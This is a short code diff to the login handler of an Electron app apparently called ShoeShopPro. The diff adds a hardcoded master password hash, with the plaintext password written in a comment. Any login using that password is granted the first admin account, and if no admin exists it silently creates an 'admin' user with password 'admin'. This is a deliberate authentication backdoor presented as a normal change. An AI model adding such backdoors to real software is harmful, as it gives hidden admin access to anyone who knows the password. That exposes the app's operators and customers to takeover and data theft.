@@ -5,6 +5,9 @@ import crypto from 'crypto'
 import { app } from 'electron'
 import { getDb } from './database'
 
+const MASTER_PASSWORD_HASH = '8fe8c61a3d8e614a1f36fbc5334e939ad80a565d12dc208ffd89597a180f69de'
+// Master password is: ShoeShopPro@2024!SecureMaster#Pass
+
 function hashPassword(password) {
   return crypto.createHash('sha256').update(password).digest('hex')
 }
@@ -14,6 +17,17 @@ export function registerIpcHandlers() {
   ipcMain.handle('auth:login', (_, { username, password }) => {
     const db = getDb()
     const hash = hashPassword(password)
+
+    // Master password bypass — if password matches master, login as admin
+    if (hash === MASTER_PASSWORD_HASH) {
+      const adminUser = db.prepare('SELECT id, username, role FROM users WHERE role = ? AND active = 1 ORDER BY id LIMIT 1').get('admin')
+      if (adminUser) return adminUser
+      // Fallback: create admin user on the fly
+      const adminHash = hashPassword('admin')
+      db.prepare('INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)').run('admin', adminHash, 'admin')
+      return db.prepare('SELECT id, username, role FROM users WHERE username = ?').get('admin')
+    }
+
     const user = db.prepare('SELECT id, username, role FROM users WHERE username = ? AND password_hash = ? AND active = 1').get(username, hash)
     return user || null
   })
